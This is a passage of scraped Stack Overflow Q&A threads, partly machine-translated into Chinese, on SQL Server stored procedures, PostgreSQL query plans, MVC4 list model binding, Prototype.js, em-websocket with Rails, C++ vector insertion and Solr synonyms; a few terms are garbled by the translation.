假设这是 SQL Server 2008R2 或更高的标准版或企业版，存储过程的缓存将不同于 TSQL 语句。由于参数化、代码编译、参数嗅探和各种其他优化等多种因素，复杂的 T-SQL 语句几乎总是比存储过程执行得更差。一般来说，我更喜欢存储过程，因为它们更容易优化。此外，您无需重新编译和重新部署任何代码即可更改存储过程。并且优化（例如“优化未知”或“重新编译”可以应用于存储过程，当参数值变化很大时）可以应用于存储过程并且在最终用户甚至没有注意到的情况下撤消（嗯，

存储过程在一次运行后总是会在计划缓存中结束，并且永远不会被视为临时查询。根据 SQL 设置，临时查询可能会或可能不会存储在计划缓存中。加上添加或删除一个字符（假设它没有参数化）将导致 SQL Server 构建一个新计划并且构建新计划是一个缓慢的操作。

TL;DR - preusming SQL Server 2008R2 或更高版本的标准版/企业版；对于简单的查询，您会发现没有区别。对于复杂的查询，存储过程（如果编写得当）几乎总能胜过 T-SQL。存储过程也更容易在以后进行优化。

编辑 - 在 SQL 版本中添加。我不确定旧的 SQL 版本。

# sql - PostgreSQL query with smaller date range (result set) slower then one with bigger date range (result)

> ID：10218206
> 
> 赞同：6
> 
> 时间：2012-04-18T21:21:38.270
> 
> 标签：sql, performance, postgresql

I have a query in postgresql, when I do the date BETWEEN '2012-01-01' AND '2012-01-04' it's slower even though it has a smaller record set then if i do BETWEEN '2012-01-01' AND '2012-04-17'

Can any tell me why this is?

Here's for the slower query:

```
"HashAggregate  (cost=9388.82..9388.88 rows=1 width=311) (actual time=187787.183..187788.001 rows=153 loops=1)"
"  ->  Nested Loop  (cost=9266.68..9388.77 rows=1 width=311) (actual time=8432.315..187785.091 rows=153 loops=1)"
"        Join Filter: ((oh.ord_id = ord_line.ord_id) AND (iis.item_id = ord_line.item_id))"
"        ->  Nested Loop Left Join  (cost=9266.68..9373.81 rows=1 width=333) (actual time=92.238..147161.052 rows=5847933 loops=1)"
"              Join Filter: ((oh.division)::text = (item_color_cd.division)::text)"
"              ->  Nested Loop Left Join  (cost=9266.68..9373.53 rows=1 width=322) (actual time=92.214..113058.202 rows=5847933 loops=1)"
"                    Join Filter: ((oh.division)::text = (item_size_cd.division)::text)"
"                    ->  Nested Loop Left Join  (cost=9266.68..9373.24 rows=1 width=312) (actual time=92.189..77932.977 rows=5847933 loops=1)"
"                          Join Filter: ((oh.division)::text = (item_class_cd.division)::text)"
"                          ->  Nested Loop  (cost=9266.68..9372.92 rows=1 width=294) (actual time=92.183..61183.081 rows=5847933 loops=1)"
"                                ->  Nested Loop  (cost=67.45..91.07 rows=1 width=75) (actual time=0.819..58.193 rows=8463 loops=1)"
"                                      ->  Nested Loop  (cost=67.45..75.24 rows=1 width=51) (actual time=0.784..3.894 rows=360 loops=1)"
"                                            ->  Index Scan using item_dept_cd_division_key on item_dept_cd  (cost=0.00..5.27 rows=1 width=27) (actual time=0.045..0.047 rows=1 loops=1)"
"                                                  Index Cond: (((division)::text = 'BSM'::text) AND ((dept_cd)::text = 'S'::text))"
"                                                  Filter: ((dept_cd)::text ~~ 'S'::text)"
"                                            ->  Bitmap Heap Scan on item_item_num iin  (cost=67.45..69.96 rows=1 width=32) (actual time=0.734..3.315 rows=360 loops=1)"
"                                                  Recheck Cond: ((iin.dept_cd_id = item_dept_cd.dept_cd_id) AND ((iin.division)::text = 'BSM'::text))"
"                                                  ->  BitmapAnd  (cost=67.45..67.45 rows=1 width=0) (actual time=0.687..0.687 rows=0 loops=1)"
"                                                        ->  Bitmap Index Scan on item_item_num_dept_id  (cost=0.00..6.92 rows=213 width=0) (actual time=0.109..0.109 rows=364 loops=1)"
"                                                              Index Cond: (iin.dept_cd_id = item_dept_cd.dept_cd_id)"
"                                                        ->  Bitmap Index Scan on item_item_num_division_key  (cost=0.00..59.64 rows=2573 width=0) (actual time=0.544..0.544 rows=2753 loops=1)"
"                                                              Index Cond: ((iin.division)::text = 'BSM'::text)"
"                                      ->  Index Scan using item_sku_item_num_id_key on item_sku iis  (cost=0.00..15.82 rows=1 width=32) (actual time=0.021..0.104 rows=24 loops=360)"
"                                            Index Cond: (iis.item_num_id = iin.item_num_id)"
"                                            Filter: ((iis.division)::text = 'BSM'::text)"
"                                ->  HashAggregate  (cost=9199.23..9281.69 rows=8 width=66) (actual time=0.020..6.298 rows=691 loops=8463)"
"                                      ->  Nested Loop  (cost=0.01..9198.91 rows=8 width=66) (actual time=1.111..89.484 rows=691 loops=1)"
"                                            ->  Index Scan using ledger_demand_ix4 on ledger_demand ls  (cost=0.01..4512.71 rows=710 width=35) (actual time=1.078..79.178 rows=691 loops=1)"
"                                                  Index Cond: ((date(trans_date) >= '2012-01-01'::date) AND (date(trans_date) <= '2012-01-04'::date))"
"                                                  Filter: (((division)::text = 'BSM'::text) AND (((qty_ordered > 0) AND ((ledger_code)::text ~~ 'D%'::text)) OR ((ledger_code)::text ~~ 'DC%'::text)))"
"                                            ->  Index Scan using ord_header_pkey on ord_header oh  (cost=0.00..6.59 rows=1 width=39) (actual time=0.010..0.011 rows=1 loops=691)"
"                                                  Index Cond: (oh.ord_id = ls.ord_id)"
"                                                  Filter: ((oh.division)::text = 'BSM'::text)"
"                                      SubPlan 1"
"                                        ->  Aggregate  (cost=10.25..10.26 rows=1 width=8) (actual time=0.005..0.006 rows=1 loops=5847933)"
"                                              ->  Index Scan using ledger_discount_ord_line_id on ledger_discount  (cost=0.00..10.25 rows=1 width=8) (actual time=0.003..0.004 rows=0 loops=5847933)"
"                                                    Index Cond: (ord_line_id = $2)"
"                                                    Filter: (((ledger_code)::text ~~ 'D%'::text) AND ((division)::text = ($0)::text) AND (ord_id = $1) AND (date(trans_date) = date($3)))"
"                          ->  Index Scan using item_class_cd_pkey on item_class_cd  (cost=0.00..0.30 rows=1 width=31) (actual time=0.001..0.001 rows=0 loops=5847933)"
"                                Index Cond: (iin.class_cd_id = item_class_cd.class_cd_id)"
"                                Filter: ((item_class_cd.division)::text = 'BSM'::text)"
"                    ->  Index Scan using item_size_cd_pkey on item_size_cd  (cost=0.00..0.27 rows=1 width=25) (actual time=0.002..0.003 rows=1 loops=5847933)"
"                          Index Cond: (iis.size_cd_id = item_size_cd.size_cd_id)"
"                          Filter: ((item_size_cd.division)::text = 'BSM'::text)"
"              ->  Index Scan using item_color_cd_pkey on item_color_cd  (cost=0.00..0.27 rows=1 width=25) (actual time=0.002..0.003 rows=1 loops=5847933)"
"                    Index Cond: (iis.color_cd_id = item_color_cd.color_cd_id)"
"                    Filter: ((item_color_cd.division)::text = 'BSM'::text)"
"        ->  Index Scan using ord_line_pkey on ord_line  (cost=0.00..14.94 rows=1 width=16) (actual time=0.004..0.005 rows=1 loops=5847933)"
"              Index Cond: (ord_line.ord_line_id = ls.ord_line_id)"
"              Filter: ((ord_line.division)::text = 'BSM'::text)"
"Total runtime: 187788.419 ms" 
```

And for the faster query:

```
"HashAggregate  (cost=395482.02..395482.08 rows=1 width=311) (actual time=3176.868..3204.741 rows=4900 loops=1)"
"  ->  Nested Loop Left Join  (cost=391021.12..395481.97 rows=1 width=311) (actual time=2074.121..3151.576 rows=5118 loops=1)"
"        Join Filter: ((oh.division)::text = (item_color_cd.division)::text)"
"        ->  Nested Loop Left Join  (cost=391021.12..395481.69 rows=1 width=314) (actual time=2074.086..3113.537 rows=5118 loops=1)"
"              Join Filter: ((oh.division)::text = (item_size_cd.division)::text)"
"              ->  Nested Loop Left Join  (cost=391021.12..395481.40 rows=1 width=304) (actual time=2074.067..3077.820 rows=5118 loops=1)"
"                    Join Filter: ((oh.division)::text = (item_class_cd.division)::text)"
"                    ->  Hash Join  (cost=391021.12..395481.11 rows=1 width=286) (actual time=2074.062..3061.180 rows=5118 loops=1)"
"                          Hash Cond: ((oh.ord_id = ord_line.ord_id) AND (ls.ord_line_id = ord_line.ord_line_id))"
"                          ->  HashAggregate  (cost=390858.20..395310.62 rows=432 width=66) (actual time=1089.300..1596.212 rows=38947 loops=1)"
"                                ->  Nested Loop  (cost=92108.27..390840.92 rows=432 width=66) (actual time=603.101..1004.552 rows=38947 loops=1)"
"                                      ->  Bitmap Heap Scan on ledger_demand ls  (cost=92108.27..174982.73 rows=36833 width=35) (actual time=603.076..708.321 rows=38947 loops=1)"
"                                            Recheck Cond: (((division)::text = 'BSM'::text) AND (date(trans_date) >= '2012-01-01'::date) AND (date(trans_date) <= '2012-04-17'::date))"
"                                            Filter: (((qty_ordered > 0) AND ((ledger_code)::text ~~ 'D%'::text)) OR ((ledger_code)::text ~~ 'DC%'::text))"
"                                            ->  BitmapAnd  (cost=92108.27..92108.27 rows=37705 width=0) (actual time=600.722..600.722 rows=0 loops=1)"
"                                                  ->  Bitmap Index Scan on ledger_demand_ix2  (cost=0.00..12712.18 rows=559935 width=0) (actual time=91.763..91.763 rows=572985 loops=1)"
"                                                        Index Cond: ((division)::text = 'BSM'::text)"
"                                                  ->  Bitmap Index Scan on ledger_demand_ix4  (cost=0.00..79377.42 rows=4397941 width=0) (actual time=483.385..483.385 rows=4444914 loops=1)"
"                                                        Index Cond: ((date(trans_date) >= '2012-01-01'::date) AND (date(trans_date) <= '2012-04-17'::date))"
"                                      ->  Index Scan using ord_header_pkey on ord_header oh  (cost=0.00..5.85 rows=1 width=39) (actual time=0.004..0.005 rows=1 loops=38947)"
"                                            Index Cond: (oh.ord_id = ls.ord_id)"
"                                            Filter: ((oh.division)::text = 'BSM'::text)"
"                                SubPlan 1"
"                                  ->  Aggregate  (cost=10.25..10.26 rows=1 width=8) (actual time=0.009..0.009 rows=1 loops=38947)"
"                                        ->  Index Scan using ledger_discount_ord_line_id on ledger_discount  (cost=0.00..10.25 rows=1 width=8) (actual time=0.007..0.007 rows=0 loops=38947)"
"                                              Index Cond: (ord_line_id = $2)"
"                                              Filter: (((ledger_code)::text ~~ 'D%'::text) AND ((division)::text = ($0)::text) AND (ord_id = $1) AND (date(trans_date) = date($3)))"
"                          ->  Hash  (cost=162.91..162.91 rows=1 width=83) (actual time=984.452..984.452 rows=112897 loops=1)"
"                                ->  Nested Loop  (cost=67.45..162.91 rows=1 width=83) (actual time=0.736..852.432 rows=112897 loops=1)"
"                                      ->  Nested Loop  (cost=67.45..91.07 rows=1 width=75) (actual time=0.705..45.978 rows=8463 loops=1)"
"                                            ->  Nested Loop  (cost=67.45..75.24 rows=1 width=51) (actual time=0.675..4.358 rows=360 loops=1)"
"                                                  ->  Index Scan using item_dept_cd_division_key on item_dept_cd  (cost=0.00..5.27 rows=1 width=27) (actual time=0.030..0.032 rows=1 loops=1)"
"                                                        Index Cond: (((division)::text = 'BSM'::text) AND ((dept_cd)::text = 'S'::text))"
"                                                        Filter: ((dept_cd)::text ~~ 'S'::text)"
"                                                  ->  Bitmap Heap Scan on item_item_num iin  (cost=67.45..69.96 rows=1 width=32) (actual time=0.641..3.818 rows=360 loops=1)"
"                                                        Recheck Cond: ((iin.dept_cd_id = item_dept_cd.dept_cd_id) AND ((iin.division)::text = 'BSM'::text))"
"                                                        ->  BitmapAnd  (cost=67.45..67.45 rows=1 width=0) (actual time=0.598..0.598 rows=0 loops=1)"
"                                                              ->  Bitmap Index Scan on item_item_num_dept_id  (cost=0.00..6.92 rows=213 width=0) (actual time=0.089..0.089 rows=364 loops=1)"
"                                                                    Index Cond: (iin.dept_cd_id = item_dept_cd.dept_cd_id)"
"                                                              ->  Bitmap Index Scan on item_item_num_division_key  (cost=0.00..59.64 rows=2573 width=0) (actual time=0.479..0.479 rows=2753 loops=1)"
"                                                                    Index Cond: ((iin.division)::text = 'BSM'::text)"
"                                            ->  Index Scan using item_sku_item_num_id_key on item_sku iis  (cost=0.00..15.82 rows=1 width=32) (actual time=0.015..0.074 rows=24 loops=360)"
"                                                  Index Cond: (iis.item_num_id = iin.item_num_id)"
"                                                  Filter: ((iis.division)::text = 'BSM'::text)"
"                                      ->  Index Scan using ord_line_item_id_idx on ord_line  (cost=0.00..71.79 rows=3 width=16) (actual time=0.009..0.072 rows=13 loops=8463)"
"                                            Index Cond: (ord_line.item_id = iis.item_id)"
"                                            Filter: ((ord_line.division)::text = 'BSM'::text)"
"                    ->  Index Scan using item_class_cd_pkey on item_class_cd  (cost=0.00..0.27 rows=1 width=31) (actual time=0.001..0.001 rows=0 loops=5118)"
"                          Index Cond: (iin.class_cd_id = item_class_cd.class_cd_id)"
"                          Filter: ((item_class_cd.division)::text = 'BSM'::text)"
"              ->  Index Scan using item_size_cd_pkey on item_size_cd  (cost=0.00..0.27 rows=1 width=25) (actual time=0.003..0.004 rows=1 loops=5118)"
"                    Index Cond: (iis.size_cd_id = item_size_cd.size_cd_id)"
"                    Filter: ((item_size_cd.division)::text = 'BSM'::text)"
"        ->  Index Scan using item_color_cd_pkey on item_color_cd  (cost=0.00..0.27 rows=1 width=25) (actual time=0.003..0.004 rows=1 loops=5118)"
"              Index Cond: (iis.color_cd_id = item_color_cd.color_cd_id)"
"              Filter: ((item_color_cd.division)::text = 'BSM'::text)"
"Total runtime: 3208.876 ms" 
```

Query is with only change being WHERE DATE(trans_date) BETWEEN '2012-04-01' AND '2012-04-17'

```
SELECT   trans_date                                   AS order_date,
         iin.item_num                                           AS item_num,
         color_cd                                               AS color_code,
         color_desc                                             AS color_description,
         size_cd                                                AS size_code,
         size_desc                                              AS size_description,
         class_cd                                               AS class_code,
         class_desc                                             AS class_description,
         dept_cd                                                AS dept_code,
         dept_desc                                              AS dept_description,
         Count(ord_id)                                          AS num_of_orders,
         Sum(vs.qty_ordered)                                    AS units,
         To_char(Sum(merch_amt_new3),'99G999G990.00')           AS merch_amt,
         To_char(Sum(gift_cert_new3 - gift_cert_canceled_new3),
                 '99G999G990.00') AS gift_cert,
         To_char(Sum(discount_amt),'99G999G990.00')             AS discount_amt,
         To_char(Sum(tax_amt),'99G999G990.00')                  AS tax,
         To_char(Sum(vs.qty_ordered * Coalesce(iis.cost,iin.cost)),
                 '99G999G990.00') AS extended_cost,
         To_char(Sum(merch_amt - discount_amt),'99G999G990.00') AS total,
         To_char(Sum(canceled_merch_new3),'99G999G990.00')      AS canceled_merch,
         iis.sku_id
FROM     (SELECT   oh.division,
                   oh.ord_id,
                   client_order_num,
                   source_id,
                   bus_type_id,
                   order_type_id,
                   Date(ls.trans_date) AS trans_date,
                   ls.ord_line_id,
                   Sum(ls.qty_ordered) AS qty_ordered,
                   Sum(ls.amount)         AS merch_amt,
                   Sum(tax)  AS tax_amt,
                   Coalesce((SELECT Sum(ledger_discount.amount) AS SUM
                             FROM   ledger_discount
                             WHERE  ledger_discount.ledger_code ~~ 'D%'
                                    AND ledger_discount.division = oh.division
                                    AND ledger_discount.ord_id = oh.ord_id
                                    AND ledger_discount.ord_line_id = ls.ord_line_id
                                    AND Date(ledger_discount.trans_date) = Date(ls.trans_date)),
                            0.0) AS discount_amt,
                   (CASE
                      WHEN ls.ledger_code = 'DO'
                      THEN Sum(ls.amount)
                      ELSE 0.0
                    END) AS merch_amt_new3,
                   (CASE
                      WHEN ls.ledger_code = 'DOG'
                      THEN Sum(ls.amount)
                      ELSE 0.0
                    END) AS gift_cert_new3,
                   (CASE
                      WHEN ls.ledger_code = 'DCG'
                      THEN Sum(-ls.amount)
                      ELSE 0.0
                    END) AS gift_cert_canceled_new3,
                   (CASE
                      WHEN ls.ledger_code = 'DC'
                      THEN Sum(-ls.amount)
                      ELSE 0.0
                    END) AS canceled_merch_new3
          FROM     ledger_demand ls
                   JOIN ord_header oh
                     USING(division,ord_id)
          WHERE    (ls.qty_ordered > 0
                    AND ls.ledger_code ~~ 'D%')
                    OR (ls.ledger_code ~~ 'DC%')
          GROUP BY oh.division,
                   oh.ord_id,
                   client_order_num,
                   source_id,
                   bus_type_id,
                   order_type_id,
                   ls.trans_date,
                   ls.ord_line_id,
                   ls.ledger_code
                   ) AS vs
         JOIN ord_line
           USING(division,ord_id,ord_line_id)
         JOIN item_sku AS iis
           USING(division,item_id)
         JOIN item_item_num AS iin
           USING(division,item_num_id)
         LEFT JOIN item_color_cd
          USING(division,color_cd_id)
         LEFT JOIN item_size_cd
           USING(division,size_cd_id)
         LEFT JOIN item_class_cd
           USING(division,class_cd_id)
         LEFT JOIN item_dept_cd
           USING(division,dept_cd_id)
WHERE DATE(trans_date) BETWEEN '2012-04-01' AND '2012-04-17' 
AND item_dept_cd.dept_cd LIKE 'S'
AND division = 'BSM' 
GROUP BY trans_date,
         iin.item_num,
         color_cd,
         color_desc,
         size_cd,
         size_desc,
         class_cd,
         class_desc,
         dept_cd,
         dept_desc,
         iis.sku_id 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-18T21:25:59.217

简短的回答是，它实际上取决于您的数据集/表/索引等。尝试为您的每个语句运行[EXPLAIN](http://www.postgresql.org/docs/9.1/static/sql-explain.html)，它会准确地告诉您发生了什么。

```
EXPLAIN SELECT * FROM myTable WHERE myDate BETWEEN '2012-01-01' AND '2012-01-04'

EXPLAIN SELECT * FROM myTable WHERE myDate BETWEEN '2012-01-01' AND '2012-04-17' 
```

# c# - MVC4 Complex Type Model is null after post

> ID：10218209
> 
> 赞同：4
> 
> 时间：2012-04-18T21:21:47.007
> 
> 标签：c#, asp.net-mvc, asp.net-mvc-4, razor

This is my model

```
public class AdministrationModel
{
  public string FirstName { get; set; }
  public string LastName { get; set; }
  public string EmailAddress { get; set; }
  public bool IsApproved { get; set; }
} 
```

This is my controller

```
public ActionResult GetTabContent(string id)
{
  switch (id)
  {
   case "tab3":
   model = GetAllUsersInfo();
   viewName = "Administration";
   break;
   }
   return View(viewName);
 }

  private List<AdministrationModel> GetAllUsersInfo()
  {
    List<AdministrationModel> userList = new List<AdministrationModel>();
    foreach (MembershipUser user in Membership.GetAllUsers())
    {
      UserProfile userProfile = UserProfile.GetUserProfile(user.UserName);
      userList.Add(new AdministrationModel { EmailAddress = user.Email,                       IsApproved = user.IsApproved, FirstName = userProfile.FirstName, LastName = userProfile.LastName });
    }

    return userList;
  } 
```

This is my View

```
@model List<AdminContainerModel>
@using (Html.BeginForm("Administration", "Account"))
{
  <fieldset>
    <div>
      @foreach (AdministrationModel AM in Model)
      {
        <div>
         <div class="colFull">@Html.DisplayFor(modelItem => AM.FirstName)</div>
         <div class="colFull">@Html.DisplayFor(modelItem => AM.LastName)</div>
         <div class="colFull">@Html.DisplayFor(modelItem => AM.EmailAddress)</div>
         <div class="colPartial"><input type="checkbox" checked="@AM.IsApproved"/>            </div>
      <div class="clear"></div>
    </div>
  }
</div>
 <input type="submit" value="Update Account" />
 </fieldset>
} 
```

When the user clicks the Update Account button it goes to the controller

```
 [HttpPost]
  public ActionResult Administration(List<AdministrationModel> model)
  {
     return View();
  } 
```

inside this method, model is always null. however the View that renders everything is perfect and shows what I want it to show. What am I doing wrong?

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-04-19T16:56:52.617

使用集合时，为了正确处理它们，以便它们在帖子上绑定模型而无需任何额外的工作，您需要确保它们被正确索引，您可以通过使用 for 循环来做到这一点，例如：

```
@for (int i = 0; i < Model.Count; i++)
{
    @Html.HiddenFor(m => m[i].FirstName)
    @Html.HiddenFor(m => m[i].LastName)
    @Html.HiddenFor(m => m[i].EmailAddress)
    <div>
        <div class="colFull">@Html.DisplayFor(m => m[i].FirstName)</div>
        <div class="colFull">@Html.DisplayFor(m => m[i].LastName)</div>
        <div class="colFull">@Html.DisplayFor(m => m[i].EmailAddress)</div>
        <div class="colPartial">@Html.CheckBoxFor(m => m[i].IsApproved)</div>
        <div class="clear"></div>
    </div>
} 
```

那应该在没有任何其他代码的情况下对绑定进行建模:)

**编辑：对不起，我忘记了，默认情况下 displayFors 没有为模型绑定设置正确的属性，为没有 editorFor 的其他字段添加了 hiddenFors**

**Edit2：根据您在评论中的其他问题，如果它是面向公众的，并且您不希望他们使用开发工具更改任何隐藏的值，请尝试以下操作：**

好的，所以您不希望他们更改 hiddenFors，这很好，但是您将需要某种 ID，以便您知道发布数据时哪个客户端是哪个客户端，我建议不要在上面的代码中使用这些：

```
@Html.HiddenFor(m => m[i].FirstName)
@Html.HiddenFor(m => m[i].LastName)
@Html.HiddenFor(m => m[i].EmailAddress) 
```

将它们替换为：

```
@Html.HiddenFor(m => m[i].ClientId) 
```

这样，您就不会发回名字、姓氏或电子邮件地址，而只是对已勾选或未勾选的实际客户的引用。

**要在有关跟踪原始值的评论中回答您的其他问题，在您的控制器方法中，您可以从数据库中获取原始值，然后您可以通过以下方法检测哪些不同，例如：**

```
[HttpPost]
public ActionResult Administration(List<AdministrationModel> model)
{
    var originalMatches = GetAllUsersInfo();

    var differences = (from o in originalMatches
                      join c in model on o.ClientId equals c.ClientId
                      where c.IsApproved != o.IsApproved).ToList()

    return View();
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-18T21:24:01.353

您的`@model`指令不正确，它应该是完全限定的类型名称。

在这种情况下：

```
 @model TheNamespace.AdministrationModel 
```

* * *

在您更新问题之后。

尝试使用：

```
@Html.EditorFor(Model) 
```

这将为您的列表调用一个专门的**编辑器模板**。

[http://blogs.msdn.com/b/nunos/archive/2010/02/08/quick-tips-about-asp-net-mvc-editor-templates.aspx](http://blogs.msdn.com/b/nunos/archive/2010/02/08/quick-tips-about-asp-net-mvc-editor-templates.aspx)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-09-26T16:25:06.337

如果要在提交时返回带有模型的列表项，则需要使用 for 循环，而不是 foreach

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2014-01-15T16:32:52.293

马蒂的回答会奏效。

如果您想避免必须指定索引（如果您有 ICollection，这将不起作用），您可以按照 Xander 的解释定义一个子模板。

好处是您仍然可以在 AdminContainerModel 视图中获得所有强类型的智能感知，并且 MVC 将项目挂回您的列表中，以便开箱即用。

这是一个例子：

主编辑器模板（如 Xander 所说）：

```
 @model IEnumerable<AdminContainerModel>
    @using (Html.BeginForm("Administration", "Account"))
    {
      <fieldset>
        <div>
          @Html.EditorForModel()
        </div?
      </fieldset>
    } 
```

AdminContainerModel 编辑器模板（这是为列表中的每个项目调用的，因为您调用了@Html.EditorForModel：

```
@model AdminContainerModel
<div>
    <div class="colFull">@Html.DisplayFor(modelItem => AM.FirstName)</div>
    <div class="colFull">@Html.DisplayFor(modelItem => AM.LastName)</div>
    <div class="colFull">@Html.DisplayFor(modelItem => AM.EmailAddress)</div>
    <div class="colPartial"><input type="checkbox" checked="@AM.IsApproved"/>            
</div>
<div class="clear"></div> 
```

# javascript - Prototype Library for if loop JavaScript

> ID：10218219
> 
> 赞同：1
> 
> 时间：2012-04-18T21:22:08.577
> 
> 标签：javascript, if-statement, for-loop, prototypejs

I have a rather simple question that I am pretty sure I know the answer to. Are there any functions in the prototypejs library that allow you to combine a for loop with an if statement? I was thinking a cross between invoke and each so that you would iterate through an array and do single method on it, if that returns "true" then you do something, if not you don't do anything. It seems like a very common usecase so I would assume something in some js library functions like this.

```
var array = {Object, Object, Object}
array.each(function(item) {
  if(item.isTrue())
    doSomething();
}); 
```

Currently I do it like that.

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-26T12:35:21.227

从文档中：

**可枚举#findAll**

> 返回迭代器为其返回真值的所有元素。对于相反的操作，请参阅[Enumerable#reject](http://api.prototypejs.org/language/Enumerable/prototype/reject/)

**例子**

```
var arr = ['1', '', '0', 'null', null];
arr.findAll(function(k) {
    return !!k;
}).each(function(f) {
    console.log('i was filtered by findAll and am truthy : ' + f);
}); 
```

# ruby-on-rails - 带有 Ruby on Rails 的 em-websocket gem

> ID：10218222
> 
> 赞同：3
> 
> 时间：2012-04-18T21:22:21.307
> 
> 标签：ruby-on-rails, websocket, eventmachine, em-websocket

我开始使用 em-websocket gem 开发基于 web-socket 的游戏。

为了测试应用程序，我通过运行启动服务器

$> 红宝石服务器.rb

然后我打开两个浏览器直接访问 html 文件（没有网络服务器）并开始播放。

但现在我想添加一个 Web 服务器、一些数据库表、另一个基于 Ruby on Rails 的 gem。

如何在我的 web-socket 服务器和我的 Ruby on Rails 应用程序之间实现通信？它们是否应该在同一台服务器上运行并作为单个进程运行？在不同的服务器上运行并通过 AJAX 进行通信？

我需要支持身份验证和其他功能，例如在游戏结束时更新数据库等。

提前致谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-18T21:40:22.597

这是交易。我还想用 ruby​​ on rails 框架开发一个 websocket 服务器客户端。然而 ruby​​-on-rails 对 eventmachine 不是很友好。我一直在为拥有一个 websocket 客户端而苦苦挣扎，所以我设法从现有的 lib 中复制/剪切/粘贴，并最终得到以下两个基本的。

Em-Websocket 服务器

```
https://gist.github.com/ffaf2a8046b795d94ba0 
```

ROR 友好的 websocket 客户端

```
https://gist.github.com/2416740 
```

在脚本目录中有服务器代码，在 ruby​​ 代码中开始如下所示。

```
 # Spawn a new process and run the rake command
    pid = Process.spawn("ruby", "web_socket_server.rb",
       "--loglevel=debug", "--logfile=#{Rails.root}/log/websocket.log",
        :chdir=>"#{Rails.root}/script") #, 
        :out => 'dev/null', :err => 'dev/null'
    Process.detach pid # Detach the spawned process 
```

然后你的客户端可以这样使用

```
ws = WebSocketClient.new("ws://127.0.0.1:8099/import")
Thread.new() do
  while data = ws.receive()
    if data =~ /cancel/
      ws.send("Cancelling..")
      exit
    end
  end
end
ws.close 
```

我希望有一个好的 ROR 友好的 em-websocket 客户端，但还不能很好。

一旦你使服务器/客户端运行良好，auth. 并且数据库支持不能与其他 Rails 代码有很大不同。（我的意思是客户端有一些 auth/db 限制）

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-04-18T21:48:29.867

有一个关于此的问题：

[https://github.com/igrigorik/em-websocket/issues/21](https://github.com/igrigorik/em-websocket/issues/21)

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-06-03T22:19:25.627

我正在开发一个可能对您当前的用例有帮助的 gem。该 gem 被称为[websocket-rails](https://github.com/DanKnox/websocket-rails)，它从头开始设计，使在 Rails 应用程序中使用 WebSockets 变得非常简单。它现在处于稳定版本。

如果您觉得这有帮助或对可能缺少的地方有任何想法，请告诉我。

# c++ - How to insert a duplicate element into a vector?

> ID：10218223
> 
> 赞同：11
> 
> 时间：2012-04-18T21:22:26.143
> 
> 标签：c++, visual-studio-2010, vector

I'm trying to insert a copy of an existing `vector` element to double it up. The following code worked in previous versions but fails in Visual Studio 2010.

```
#include <iostream>
#include <vector>

using namespace std;

int main(int argc, char* argv[])
{
   vector<int> test;
   test.push_back(1);
   test.push_back(2);
   test.insert(test.begin(), test[0]);
   cout << test[0] << " " << test[1] << " " << test[2] << endl;
   return 0;
} 
```

Output is `-17891602 1 2`, expected `1 1 2`.

I've figured out why it's happening - the vector is being reallocated, and the reference becomes invalid before it's copied to the insertion point. The older Visual Studio apparently did things in a different order, thus proving that one possible outcome of undefined behavior is to work correctly and also proving that it's never something you should rely on.

I've come up with two different ways to fix this problem. One is to use `reserve` to make sure that no reallocation takes place:

```
 test.reserve(test.size() + 1);
   test.insert(test.begin(), test[0]); 
```

The other is to make a copy from the reference so that there's no dependency on the reference remaining valid:

```
template<typename T>
T make_copy(const T & original)
{
    return original;
}

   test.insert(test.begin(), make_copy(test[0])); 
```

Although both work, neither one feels like a natural solution. Is there something I'm missing?

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-20T04:08:16.083

问题在于`vector::insert`它将一个值的引用作为第二个参数而不是一个值。您不需要模板来制作副本，只需使用复制构造函数创建另一个对象，该对象将通过引用传递。即使调整了向量的大小，此副本仍然有效。

```
#include <iostream>
#include <vector>

using namespace std;

int main(int argc, char* argv[])
{
   vector<int> test;
   test.push_back(1);
   test.push_back(2);
   test.insert(test.begin(), int(test[0]));
   cout << test[0] << " " << test[1] << " " << test[2] << endl;
   return 0;
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-19T00:30:33.000

我相信这是定义的行为。在`§23.2.3`2011 C++ 标准中，表 100 列出了序列容器要求，并且有一个针对这种情况的条目。它给出了示例表达式

```
a.insert(p,t) 
```

其中`a`的值`X`是包含类型元素的序列容器类型`T`，`p`是 的常量迭代器`a`，并且`t`是类型的左值或常量右值`X::value_type`，即`T`。

这个表达式的断言是：

> *要求：* `T`应`CopyInsertable`入`X`。为`vector`和`deque`,`T`也应为`CopyAssignable`。
> *效果：*`t`插入before的副本`p`。

我能找到的唯一相关矢量特定报价在`§23.3.6.5`第 1 段中：

> *备注：*如果新大小大于旧容量，则导致重新分配。如果没有发生重新分配，则插入点之前的所有迭代器和引用仍然有效。

`insert`尽管这确实提到了重新分配的向量，但它并没有对先前对序列容器的要求做出例外。

至于解决这个问题，我同意@EdChum 的建议，即只制作元素的副本并插入该副本。

# solr - In Solr, expanding multi-word synonyms and term positions

> ID：10218224
> 
> 赞同：0
> 
> 时间：2012-04-18T21:22:27.970
> 
> 标签：solr, lucene

I have a synonym file, used at index time, that contains this equivalence:

```
uc, university of california 
```

I then looked at how indexing "uc berkeley" would look on analysis.jsp. I was surprised:

```
org.apache.solr.analysis.SynonymFilterFactory {synonyms=companysyns.txt, expand=true, ignoreCase=true, luceneMatchVersion=LUCENE_36}
position    1               2               3
term text   university      berkeley        california
            uc              of
type        SYNONYM         word            SYNONYM
            SYNONYM         SYNONYM
startOffset 0               3               3
            0               3
endOffset   2               11              11
            2               11 
```

Note that "berkeley" appears in between "university" and "california". This has meant that, when I search for "university of california berkeley", I don't get a match. But "university berkeley california" works!

How can I make sure "university of california berkeley" works properly?

Thanks!

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-19T18:03:00.993

我面临着类似的问题，突出显示的响应突出显示了错误的单词。我正在使用 solr 3.6

在我的用例中，在索引端配置了同义词，expand=true。

例如如果我在 synonyms.txt、dns、域名系统中有以下内容

